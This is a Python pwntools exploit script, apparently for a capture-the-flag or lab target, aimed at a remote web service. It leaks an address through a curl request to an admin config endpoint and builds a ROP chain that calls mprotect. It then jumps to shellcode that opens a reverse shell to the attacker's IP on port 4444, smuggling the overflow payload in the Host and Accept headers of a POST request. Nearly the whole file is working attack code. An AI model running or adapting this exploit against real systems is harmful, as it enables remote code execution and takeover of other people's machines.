#!/usr/bin/env python3
from pwn import *
import subprocess
import json 

context.arch = 'amd64'
context.os = 'linux'

binary = args.BIN
context.terminal = ["tmux", "splitw" , "-v"]


gs = '''
continue
b *0x4051da
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return remote(str(args.IP) , int(args.PORT))


# Need to start remote before curl is called 
p = start()

get_ip_command = ['curl', 'ifconfig.me']
ip_result = subprocess.run(get_ip_command, capture_output=True, text=True)
print(ip_result.stdout.strip())


# Curl the leak
config_addr = 'http://' + str(args.IP) + '/!admin/config'
curl_command = ['curl', '-d', '{"dashboard": "get"}', '-H', 'Content-Type: application/json', config_addr]
result = subprocess.run(curl_command, capture_output=True, text=True)
leak = int(json.loads(result.stdout)["Host OS"].split(" ")[-1])

print(f'Leaked Address {hex(leak)}')

# If number is negative
if leak < 0:
    leak = leak + 2**32

# leak_calculation
rop_addr = leak + 0x1D0

# GADGETS
# NOTE: Some gadget addresses need to be checked as they may not exist
pop_rax = 0x40ecd2
pop_rsi = 0x4128bd
pop_rdx = 0x4b4d1b
syscall = 0x44ea34
pop_rdi = 0x401b22
add_rax = 0x4e0dc0
jmp_rax = 0x401e68

# mprotect(0x7fffffff8000, 0x2000, RWX)
rop_chain = p64(pop_rdi)
rop_chain += p64((rop_addr//0x1000)*0x1000) # Super hacker

rop_chain += p64(pop_rsi)
rop_chain += p64(0x2000)

rop_chain += p64(pop_rdx)
rop_chain += p64(7)
rop_chain += p64(0xdeadbeef)

rop_chain += p64(pop_rax)
rop_chain += p64(9)         # Watch 0xa > interpreted as '\n'

rop_chain += p64(add_rax)
rop_chain += p64(syscall)

# Jump to shellcode
rop_chain += p64(pop_rax)
rop_chain += p64(rop_addr + 0xd0) # Dive into the nop 
rop_chain += p64(jmp_rax)

# Reverse shell = connect + dupsh
# Before throwing exploit start nc -lvp 4444
shellcode = asm(shellcraft.connect(args.MY_IP, 4444)) + asm(shellcraft.dupsh())

# Chain for shellcode
chain = b'\x90'*(336-len(shellcode)) + shellcode + rop_addr.to_bytes(6, 'little') + b'\x00\x00'
# Full Post Request with shellcode and rop
post  = b"POST / HTTP/1.1\r\nHost:  " + chain + b"\r\n\
    If-Modified-Since:\r\n\
    Accept: " + rop_chain + b"\r\n\
    AB=C\r\n\r\n"

p.send(post)
p.interactive()